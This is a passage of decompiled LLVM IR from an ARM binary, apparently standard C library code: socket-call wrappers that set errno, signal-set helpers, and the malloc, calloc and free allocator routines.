dec_label_pc_13080:                               ; preds = %entry, %dec_label_pc_13070
  %v0_13080 = phi i32 [ %v0_13060, %entry ], [ -1, %dec_label_pc_13070 ]
  %v2_13084 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13084, i32* @r4, align 4
  store i32 %v6_13054, i32* @r5, align 4
  ret i32 %v0_13080

; uselistorder directives
  uselistorder i32 %v0_13060, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13080, { 1, 0 }
}

define i32 @__libc_recvmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13088 = load i32, i32* @r4, align 4
  store i32 %v3_13088, i32* %stack_var_-8, align 4
  %v0_1308c = call i32 @recvmsg()
  store i32 %v0_1308c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1308c, -4095
  br i1 %tmp, label %dec_label_pc_130ac, label %dec_label_pc_1309c

dec_label_pc_1309c:                               ; preds = %entry
  %v0_1309c = call i32 @__errno_location()
  %v0_130a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_130a0 = sub i32 0, %v0_130a0
  %v2_130a4 = inttoptr i32 %v0_1309c to i32*
  store i32 %v1_130a0, i32* %v2_130a4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_130ac

dec_label_pc_130ac:                               ; preds = %entry, %dec_label_pc_1309c
  %v0_130ac = phi i32 [ %v0_1308c, %entry ], [ -1, %dec_label_pc_1309c ]
  %v2_130b0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_130b0, i32* @r4, align 4
  ret i32 %v0_130ac

; uselistorder directives
  uselistorder i32 %v0_1308c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_130ac, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_130b4 = load i32, i32* @r4, align 4
  store i32 %v3_130b4, i32* %stack_var_-8, align 4
  %v0_130b8 = call i32 @send()
  store i32 %v0_130b8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_130b8, -4095
  br i1 %tmp, label %dec_label_pc_130d8, label %dec_label_pc_130c8

dec_label_pc_130c8:                               ; preds = %entry
  %v0_130c8 = call i32 @__errno_location()
  %v0_130cc = load i32, i32* %r4.global-to-local, align 4
  %v1_130cc = sub i32 0, %v0_130cc
  %v2_130d0 = inttoptr i32 %v0_130c8 to i32*
  store i32 %v1_130cc, i32* %v2_130d0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_130d8

dec_label_pc_130d8:                               ; preds = %entry, %dec_label_pc_130c8
  %v0_130d8 = phi i32 [ %v0_130b8, %entry ], [ -1, %dec_label_pc_130c8 ]
  %v2_130dc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_130dc, i32* %r4.global-to-local, align 4
  ret i32 %v0_130d8

; uselistorder directives
  uselistorder i32 %v0_130b8, { 1, 0, 2 }
  uselistorder i32 ()* @send, { 1, 0 }
  uselistorder label %dec_label_pc_130d8, { 1, 0 }
}

define i32 @__libc_sendmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_130e0 = load i32, i32* @r4, align 4
  store i32 %v3_130e0, i32* %stack_var_-8, align 4
  %v0_130e4 = call i32 @sendmsg()
  store i32 %v0_130e4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_130e4, -4095
  br i1 %tmp, label %dec_label_pc_13104, label %dec_label_pc_130f4

dec_label_pc_130f4:                               ; preds = %entry
  %v0_130f4 = call i32 @__errno_location()
  %v0_130f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_130f8 = sub i32 0, %v0_130f8
  %v2_130fc = inttoptr i32 %v0_130f4 to i32*
  store i32 %v1_130f8, i32* %v2_130fc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13104

dec_label_pc_13104:                               ; preds = %entry, %dec_label_pc_130f4
  %v0_13104 = phi i32 [ %v0_130e4, %entry ], [ -1, %dec_label_pc_130f4 ]
  %v2_13108 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13108, i32* %r4.global-to-local, align 4
  ret i32 %v0_13104

; uselistorder directives
  uselistorder i32 %v0_130e4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13104, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1310c = load i32, i32* @r4, align 4
  store i32 %v3_1310c, i32* %stack_var_-12, align 4
  %v6_1310c = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  %v0_13118 = call i32 @sendto()
  store i32 %v0_13118, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13118, -4095
  br i1 %tmp, label %dec_label_pc_13138, label %dec_label_pc_13128

dec_label_pc_13128:                               ; preds = %entry
  %v0_13128 = call i32 @__errno_location()
  %v0_1312c = load i32, i32* %r4.global-to-local, align 4
  %v1_1312c = sub i32 0, %v0_1312c
  %v2_13130 = inttoptr i32 %v0_13128 to i32*
  store i32 %v1_1312c, i32* %v2_13130, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13138

dec_label_pc_13138:                               ; preds = %entry, %dec_label_pc_13128
  %v0_13138 = phi i32 [ %v0_13118, %entry ], [ -1, %dec_label_pc_13128 ]
  %v2_1313c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1313c, i32* @r4, align 4
  store i32 %v6_1310c, i32* @r5, align 4
  ret i32 %v0_13138

; uselistorder directives
  uselistorder i32 %v0_13118, { 1, 0, 2 }
  uselistorder i32 ()* @sendto, { 1, 0 }
  uselistorder label %dec_label_pc_13138, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13140 = load i32, i32* @r4, align 4
  store i32 %v3_13140, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_13148 = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  store i32 %v5_13148, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13148, -4095
  br i1 %tmp, label %dec_label_pc_13168, label %dec_label_pc_13158

dec_label_pc_13158:                               ; preds = %entry
  %v0_13158 = call i32 @__errno_location()
  %v0_1315c = load i32, i32* %r4.global-to-local, align 4
  %v1_1315c = sub i32 0, %v0_1315c
  %v2_13160 = inttoptr i32 %v0_13158 to i32*
  store i32 %v1_1315c, i32* %v2_13160, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13168

dec_label_pc_13168:                               ; preds = %entry, %dec_label_pc_13158
  %v0_13168 = phi i32 [ %v5_13148, %entry ], [ -1, %dec_label_pc_13158 ]
  %v2_1316c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1316c, i32* @r4, align 4
  ret i32 %v0_13168

; uselistorder directives
  uselistorder i32 %v5_13148, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13168, { 1, 0 }
}

define i32 @socket() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13170 = load i32, i32* @r4, align 4
  store i32 %v3_13170, i32* %stack_var_-8, align 4
  %v0_13174 = call i32 @socket()
  store i32 %v0_13174, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13174, -4095
  br i1 %tmp, label %dec_label_pc_13194, label %dec_label_pc_13184

dec_label_pc_13184:                               ; preds = %entry
  %v0_13184 = call i32 @__errno_location()
  %v0_13188 = load i32, i32* %r4.global-to-local, align 4
  %v1_13188 = sub i32 0, %v0_13188
  %v2_1318c = inttoptr i32 %v0_13184 to i32*
  store i32 %v1_13188, i32* %v2_1318c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13194

dec_label_pc_13194:                               ; preds = %entry, %dec_label_pc_13184
  %v0_13194 = phi i32 [ %v0_13174, %entry ], [ -1, %dec_label_pc_13184 ]
  %v2_13198 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13198, i32* @r4, align 4
  ret i32 %v0_13194

; uselistorder directives
  uselistorder i32 %v0_13174, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13194, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %tmp2 = icmp slt i32 %arg1, 1
  br i1 %tmp2, label %dec_label_pc_131b8, label %dec_label_pc_131a8

dec_label_pc_131a8:                               ; preds = %entry
  %v8_131ac = icmp sgt i32 %arg1, 64
  br i1 %v8_131ac, label %dec_label_pc_131b8, label %dec_label_pc_131b0

dec_label_pc_131b0:                               ; preds = %dec_label_pc_131a8
  %v0_131b4 = call i32 @__sigaddset()
  br label %dec_label_pc_131b8

dec_label_pc_131b8:                               ; preds = %dec_label_pc_131a8, %entry, %dec_label_pc_131b0
  %v0_131b8 = call i32 @__errno_location()
  %v2_131c0 = inttoptr i32 %v0_131b8 to i32*
  store i32 22, i32* %v2_131c0, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_131b8, { 2, 0, 1 }
}

define i32 @__GI_sigdelset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %tmp2 = icmp slt i32 %arg1, 1
  br i1 %tmp2, label %dec_label_pc_131e8, label %dec_label_pc_131d8

dec_label_pc_131d8:                               ; preds = %entry
  %v8_131dc = icmp sgt i32 %arg1, 64
  br i1 %v8_131dc, label %dec_label_pc_131e8, label %dec_label_pc_131e0

dec_label_pc_131e0:                               ; preds = %dec_label_pc_131d8
  %v0_131e4 = call i32 @__sigdelset()
  br label %dec_label_pc_131e8

dec_label_pc_131e8:                               ; preds = %dec_label_pc_131d8, %entry, %dec_label_pc_131e0
  %v0_131e8 = call i32 @__errno_location()
  %v2_131f0 = inttoptr i32 %v0_131e8 to i32*
  store i32 22, i32* %v2_131f0, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_131e8, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_13208 = call i32 @__GI_memset()
  ret i32 0
}

define i32 @sigfillset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 255, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_13220 = call i32 @__GI_memset()
  ret i32 0
}

define i32 @sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %tmp2 = icmp slt i32 %arg1, 1
  br i1 %tmp2, label %dec_label_pc_13248, label %dec_label_pc_13238

dec_label_pc_13238:                               ; preds = %entry
  %v8_1323c = icmp sgt i32 %arg1, 64
  br i1 %v8_1323c, label %dec_label_pc_13248, label %dec_label_pc_13240

dec_label_pc_13240:                               ; preds = %dec_label_pc_13238
  %v0_13244 = call i32 @__sigismember()
  br label %dec_label_pc_13248

dec_label_pc_13248:                               ; preds = %dec_label_pc_13238, %entry, %dec_label_pc_13240
  %v0_13248 = call i32 @__errno_location()
  %v2_13250 = inttoptr i32 %v0_13248 to i32*
  store i32 22, i32* %v2_13250, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13248, { 2, 0, 1 }
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_1325c = load i32, i32* @r4, align 4
  store i32 %v3_1325c, i32* %stack_var_-8, align 4
  %v0_13260 = load i32, i32* @r1, align 4
  %v2_13260 = icmp eq i32 %v0_13260, 0
  %v0_13264 = load i32, i32* @r0, align 4
  store i32 %v0_13264, i32* @r4, align 4
  br i1 %v2_13260, label %dec_label_pc_13288, label %dec_label_pc_13278

dec_label_pc_13278:                               ; preds = %entry
  %v1_13270 = add i32 %v0_13264, 92
  %v4_13278 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* null, i32 %v1_13270)
  %v2_1327c = icmp eq i32 %v4_13278, 0
  br i1 %v2_1327c, label %dec_label_pc_1328c, label %dec_label_pc_13288

dec_label_pc_13288:                               ; preds = %dec_label_pc_13278, %entry
  br label %dec_label_pc_1328c

dec_label_pc_1328c:                               ; preds = %dec_label_pc_13278, %dec_label_pc_13288
  %storemerge = phi i32 [ 0, %dec_label_pc_13288 ], [ 1, %dec_label_pc_13278 ]
  %v1_13290 = load i32, i32* @r4, align 4
  %v2_13290 = add i32 %v1_13290, 88
  %v3_13290 = inttoptr i32 %v2_13290 to i32*
  store i32 %storemerge, i32* %v3_13290, align 4
  %v2_13294 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13294, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder %_TYPEDEF_sigset_t* null, { 1, 3, 4, 2, 0 }
  uselistorder label %dec_label_pc_1328c, { 1, 0 }
}

define i32 @__sigismember() local_unnamed_addr {
entry:
  %v0_13298 = load i32, i32* @r1, align 4
  %v1_13298 = add i32 %v0_13298, -1
  %v3_1329c = udiv i32 %v1_13298, 32
  %v0_132a0 = load i32, i32* @r0, align 4
  %v4_132a0 = mul nuw nsw i32 %v3_1329c, 4
  %v5_132a0 = add i32 %v0_132a0, %v4_132a0
  %v6_132a0 = inttoptr i32 %v5_132a0 to i32*
  %v7_132a0 = load i32, i32* %v6_132a0, align 4
  %v1_132a4 = urem i32 %v1_13298, 32
  %v7_132ac = shl i32 1, %v1_132a4
  %v8_132ac = and i32 %v7_132a0, %v7_132ac
  %v10_132ac = icmp ne i32 %v8_132ac, 0
  %. = zext i1 %v10_132ac to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_13298, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_132bc = load i32, i32* @r1, align 4
  %v1_132bc = add i32 %v0_132bc, -1
  %v3_132c0 = udiv i32 %v1_132bc, 32
  %v0_132c4 = load i32, i32* @r0, align 4
  %v4_132c4 = mul nuw nsw i32 %v3_132c0, 4
  %v5_132c4 = add i32 %v0_132c4, %v4_132c4
  %v6_132c4 = inttoptr i32 %v5_132c4 to i32*
  %v7_132c4 = load i32, i32* %v6_132c4, align 4
  %v1_132c8 = urem i32 %v1_132bc, 32
  %v7_132d0 = shl i32 1, %v1_132c8
  %v8_132d0 = or i32 %v7_132c4, %v7_132d0
  store i32 %v8_132d0, i32* %v6_132c4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_132bc, { 1, 0 }
}

define i32 @__sigdelset() local_unnamed_addr {
entry:
  %v0_132e0 = load i32, i32* @r1, align 4
  %v1_132e0 = add i32 %v0_132e0, -1
  %v3_132e4 = udiv i32 %v1_132e0, 32
  %v0_132e8 = load i32, i32* @r0, align 4
  %v4_132e8 = mul nuw nsw i32 %v3_132e4, 4
  %v5_132e8 = add i32 %v0_132e8, %v4_132e8
  %v6_132e8 = inttoptr i32 %v5_132e8 to i32*
  %v7_132e8 = load i32, i32* %v6_132e8, align 4
  %v1_132ec = urem i32 %v1_132e0, 32
  %tmp = shl i32 -1, %v1_132ec
  %v8_132f4 = add i32 %tmp, -1
  %v9_132f4 = and i32 %v7_132e8, %v8_132f4
  store i32 %v9_132f4, i32* %v6_132e8, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_132e0, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13304 = load i32, i32* @r4, align 4
  %v6_13304 = load i32, i32* @r5, align 4
  %v9_13304 = load i32, i32* @r6, align 4
  %v0_13308 = load i32, i32* %r0.global-to-local, align 4
  %v2_13308 = icmp eq i32 %v0_13308, 0
  %v2_1330c = ptrtoint i32* %stack_var_-20 to i32
  br i1 %v2_13308, label %bb, label %dec_label_pc_13318

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13320

dec_label_pc_13318:                               ; preds = %entry
  %tmp = icmp ugt i32 %v0_13308, -8
  br i1 %tmp, label %dec_label_pc_13424, label %dec_label_pc_13320

dec_label_pc_13320:                               ; preds = %bb, %dec_label_pc_13318
  %v0_13320 = phi i32 [ %v0_13308, %dec_label_pc_13318 ], [ 1, %bb ]
  %v1_13320 = add i32 %v0_13320, 4
  store i32 %v1_13320, i32* %stack_var_-20, align 4
  store i32 %v2_1330c, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2f3bc.271 to i32), i32* %r0.global-to-local, align 4
  store i32 62768, i32* @r5, align 4
  %v2_13338 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2f3bc.271 to i32))
  store i32 ptrtoint (i32** @global_var_2a9c4.687 to i32), i32* %r0.global-to-local, align 4
  %v3_13344 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_2a9c4.687 to i32*), i32 %v2_1330c)
  store i32 %v3_13344, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2f3bc.271 to i32), i32* @r0, align 4
  store i32 78684, i32* @lr, align 4
  %v1_13358 = call i32 @pthread_mutex_unlock()
  store i32 %v1_13358, i32* %r0.global-to-local, align 4
  %v0_1335c = load i32, i32* @r4, align 4
  %v2_1335c = icmp eq i32 %v0_1335c, 0
  br i1 %v2_1335c, label %dec_label_pc_13364, label %dec_label_pc_13414

dec_label_pc_13364:                               ; preds = %dec_label_pc_13320
  %v2_13368 = load i32, i32* @global_var_2f3e8.239, align 4
  store i32 %v2_13368, i32* @r4, align 4
  %v2_1336c = load i32, i32* %stack_var_-20, align 4
  %v3_13370 = icmp ult i32 %v2_1336c, %v2_13368
  br i1 %v3_13370, label %.thread3, label %bb14

bb14:                                             ; preds = %dec_label_pc_13364
  %v3_13374 = add i32 %v2_13368, -1
  %v2_13378 = add i32 %v3_13374, %v2_1336c
  %v2_1337c = sub i32 0, %v2_13368
  store i32 %v2_1337c, i32* @r2, align 4
  %v3_13380 = and i32 %v2_13378, %v2_1337c
  store i32 %v3_13380, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_13364, %bb14
  store i32 ptrtoint (i32* @global_var_2f574.269 to i32), i32* %r0.global-to-local, align 4
  %v2_1338c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2f574.269 to i32))
  %v0_13390 = load i32, i32* @r4, align 4
  store i32 %v0_13390, i32* %r0.global-to-local, align 4
  %v1_13394 = call i32 @__GI_sbrk(i32 %v0_13390)
  store i32 %v1_13394, i32* %r0.global-to-local, align 4
  %v7_13398 = icmp eq i32 %v1_13394, -1
  br i1 %v7_13398, label %bb15, label %dec_label_pc_133a4

bb15:                                             ; preds = %.thread3
  store i32 %v1_13394, i32* @r5, align 4
  br label %dec_label_pc_133b8

dec_label_pc_133a4:                               ; preds = %.thread3
  %v1_133a4 = add i32 %v1_13394, 3
  %v1_133a8 = and i32 %v1_133a4, -4
  store i32 %v1_133a8, i32* @r5, align 4
  %v9_133ac = icmp eq i32 %v1_133a8, %v1_13394
  br i1 %v9_133ac, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_133a4
  %v3_133b0 = sub i32 %v1_133a8, %v1_13394
  store i32 %v3_133b0, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_133a4, %bb16
  %v1_133b4 = xor i1 %v9_133ac, true
  call void @__pseudo_cond_branch(i1 %v1_133b4, i32 ptrtoint (i32* @global_var_14c30.691 to i32))
  br label %dec_label_pc_133b8

dec_label_pc_133b8:                               ; preds = %bb15, %bb17
  store i32 ptrtoint (i32* @global_var_2f574.269 to i32), i32* @r0, align 4
  store i32 78792, i32* @lr, align 4
  %v1_133c4 = call i32 @pthread_mutex_unlock()
  store i32 %v1_133c4, i32* %r0.global-to-local, align 4
  %v0_133c8 = load i32, i32* @r5, align 4
  %v7_133c8 = icmp eq i32 %v0_133c8, -1
  br i1 %v7_133c8, label %dec_label_pc_13424, label %dec_label_pc_133d0

dec_label_pc_133d0:                               ; preds = %dec_label_pc_133b8
  store i32 ptrtoint (i32* @global_var_2f3bc.271 to i32), i32* %r0.global-to-local, align 4
  %v2_133dc = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2f3bc.271 to i32))
  %v0_133e0 = load i32, i32* @r4, align 4
  %v0_133e4 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_2a9c4.687 to i32), i32* %r0.global-to-local, align 4
  %v4_133ec = call i32 @__heap_free(i32* bitcast (i32** @global_var_2a9c4.687 to i32*), i32 %v0_133e4, i32 %v0_133e0)
  store i32 ptrtoint (i32** @global_var_2a9c4.687 to i32), i32* %r0.global-to-local, align 4
  %v3_133f8 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_2a9c4.687 to i32*), i32 %v2_1330c)
  store i32 %v3_133f8, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2f3bc.271 to i32), i32* @r0, align 4
  store i32 78860, i32* @lr, align 4
  %v1_13408 = call i32 @pthread_mutex_unlock()
  store i32 %v1_13408, i32* %r0.global-to-local, align 4
  %v0_1340c = load i32, i32* @r4, align 4
  %v2_1340c = icmp eq i32 %v0_1340c, 0
  br i1 %v2_1340c, label %dec_label_pc_13424, label %dec_label_pc_13414

dec_label_pc_13414:                               ; preds = %dec_label_pc_13320, %dec_label_pc_133d0
  %v1_13418 = phi i32 [ %v0_1335c, %dec_label_pc_13320 ], [ %v0_1340c, %dec_label_pc_133d0 ]
  %v2_13414 = load i32, i32* %stack_var_-20, align 4
  %v2_13418 = inttoptr i32 %v1_13418 to i32*
  store i32 %v2_13414, i32* %v2_13418, align 4
  %v3_13418 = load i32, i32* @r4, align 4
  %v4_13418 = add i32 %v3_13418, 4
  %v2_1341c = icmp eq i32 %v4_13418, 0
  br i1 %v2_1341c, label %dec_label_pc_13424, label %dec_label_pc_13434

dec_label_pc_13424:                               ; preds = %dec_label_pc_13414, %dec_label_pc_133d0, %dec_label_pc_133b8, %dec_label_pc_13318
  %v0_13424 = call i32 @__errno_location()
  store i32 %v0_13424, i32* %r0.global-to-local, align 4
  %v2_1342c = inttoptr i32 %v0_13424 to i32*
  store i32 12, i32* %v2_1342c, align 4
  br label %dec_label_pc_13434

dec_label_pc_13434:                               ; preds = %dec_label_pc_13414, %dec_label_pc_13424
  %v0_13434 = phi i32 [ %v4_13418, %dec_label_pc_13414 ], [ 0, %dec_label_pc_13424 ]
  store i32 %v0_13434, i32* %r0.global-to-local, align 4
  store i32 %v3_13304, i32* @r4, align 4
  store i32 %v6_13304, i32* @r5, align 4
  store i32 %v9_13304, i32* @r6, align 4
  ret i32 %v0_13434

; uselistorder directives
  uselistorder i32 %v0_13434, { 1, 0 }
  uselistorder i32 %v1_133a8, { 1, 0, 2 }
  uselistorder i32 %v1_13394, { 3, 0, 2, 4, 1, 5 }
  uselistorder i32 %v0_13308, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 4, 7, 8, 9, 3, 10, 13, 12, 11, 0, 14, 15, 16, 1, 2 }
  uselistorder label %dec_label_pc_13434, { 1, 0 }
  uselistorder label %dec_label_pc_13414, { 1, 0 }
  uselistorder label %dec_label_pc_133b8, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_13320, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_13458 = load i32, i32* @r4, align 4
  store i32 %v3_13458, i32* %stack_var_-12, align 4
  %v6_13458 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v2_13460 = mul i32 %arg2, %arg1
  store i32 %v2_13460, i32* @r4, align 4
  %v2_13464 = icmp eq i32 %arg1, 0
  br i1 %v2_13464, label %dec_label_pc_13490, label %dec_label_pc_13470

dec_label_pc_13470:                               ; preds = %entry
  %v2_13470 = udiv i32 %v2_13460, %arg1
  %v9_13474 = icmp eq i32 %v2_13470, %arg2
  store i32 0, i32* @r5, align 4
  br i1 %v9_13474, label %dec_label_pc_13490, label %dec_label_pc_13480

dec_label_pc_13480:                               ; preds = %dec_label_pc_13470
  %v0_13480 = call i32 @__errno_location()
  %v2_13488 = inttoptr i32 %v0_13480 to i32*
  store i32 12, i32* %v2_13488, align 4
  br label %dec_label_pc_134a8

dec_label_pc_13490:                               ; preds = %dec_label_pc_13470, %entry
  %v1_13494 = call i32 @malloc(i32 %v2_13460)
  store i32 %v1_13494, i32* @r5, align 4
  %v0_1349c = load i32, i32* @r4, align 4
  store i32 %v0_1349c, i32* @r2, align 4
  store i32 79016, i32* @lr, align 4
  %v1_134a4 = icmp ne i32 %v1_13494, 0
  call void @__pseudo_cond_branch(i1 %v1_134a4, i32 ptrtoint (i32* @global_var_12610.692 to i32))
  br label %dec_label_pc_134a8

dec_label_pc_134a8:                               ; preds = %dec_label_pc_13480, %dec_label_pc_13490
  %v0_134a8 = load i32, i32* @r5, align 4
  %v2_134ac = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_134ac, i32* @r4, align 4
  store i32 %v6_13458, i32* @r5, align 4
  ret i32 %v0_134a8

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_134a8, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v0_134b0 = load i32, i32* @r0, align 4
  %v2_134b0 = icmp eq i32 %v0_134b0, 0
  store i1 %v2_134b0, i1* @cpsr_z, align 1
  %v3_134b4 = load i32, i32* @r4, align 4
  store i32 %v3_134b4, i32* %stack_var_-24, align 4
  %v6_134b4 = load i32, i32* @r5, align 4
  %v9_134b4 = load i32, i32* @r6, align 4
  %v15_134b4 = load i32, i32* @r8, align 4
  br i1 %v2_134b0, label %bb, label %bb11

bb:                                               ; preds = %entry
  ret i32 0

bb11:                                             ; preds = %entry
  %v1_134bc = add i32 %v0_134b0, -4
  %v2_134bc = inttoptr i32 %v1_134bc to i32*
  %v3_134bc = load i32, i32* %v2_134bc, align 4
  store i32 %v3_134bc, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_2a9c4.687 to i32), i32* @r8, align 4
  store i32 %v1_134bc, i32* @r4, align 4
  %v2_134d4 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2f3bc.271 to i32))
  %v0_134d8 = load i32, i32* @r4, align 4
  %v0_134dc = load i32, i32* @r5, align 4
  %v0_134e0 = load i32, i32* @r8, align 4
  %v3_134e4 = inttoptr i32 %v0_134e0 to i32*
  %v4_134e4 = call i32 @__heap_free(i32* %v3_134e4, i32 %v0_134d8, i32 %v0_134dc)
  %v1_134ec = inttoptr i32 %v4_134e4 to i32*
  %v2_134ec = load i32, i32* %v1_134ec, align 4
  store i32 %v2_134ec, i32* @r6, align 4
  %v2_134f0 = load i32, i32* @global_var_2f3e8.239, align 4
  %v4_134f4 = mul i32 %v2_134f0, 8
  %v6_134f4 = icmp ult i32 %v2_134ec, %v4_134f4
  store i32 %v4_134e4, i32* @r4, align 4
  br i1 %v6_134f4, label %dec_label_pc_13534, label %dec_label_pc_13500

dec_label_pc_13500:                               ; preds = %bb11
  %v2_13508 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2f574.269 to i32))
  %v1_13510 = call i32 @__GI_sbrk(i32 0)
  %v0_13514 = load i32, i32* @r4, align 4
  %v1_13514 = add i32 %v0_13514, 12
  store i32 %v1_13514, i32* @r5, align 4
  %v9_13518 = icmp eq i32 %v1_13514, %v1_13510
  br i1 %v9_13518, label %dec_label_pc_1353c, label %dec_label_pc_13520

dec_label_pc_13520:                               ; preds = %dec_label_pc_13500
  store i32 ptrtoint (i32* @global_var_2f574.269 to i32), i32* @r0, align 4
  %v1_1352c = call i32 @pthread_mutex_unlock()
  br label %dec_label_pc_13534

dec_label_pc_13534:                               ; preds = %bb11, %dec_label_pc_13520, %bb14
  %storemerge = phi i32 [ ptrtoint (i32* @global_var_2f574.269 to i32), %bb14 ], [ ptrtoint (i32* @global_var_2f3bc.271 to i32), %bb11 ], [ ptrtoint (i32* @global_var_2f3bc.271 to i32), %dec_label_pc_13520 ]
  store i32 %storemerge, i32* @r0, align 4
  %v2_13534 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13534, i32* @r4, align 4
  store i32 %v6_134b4, i32* @r5, align 4
  store i32 %v9_134b4, i32* @r6, align 4
  store i32 %v15_134b4, i32* @r8, align 4
  %v0_13538 = call i32 @pthread_mutex_unlock()
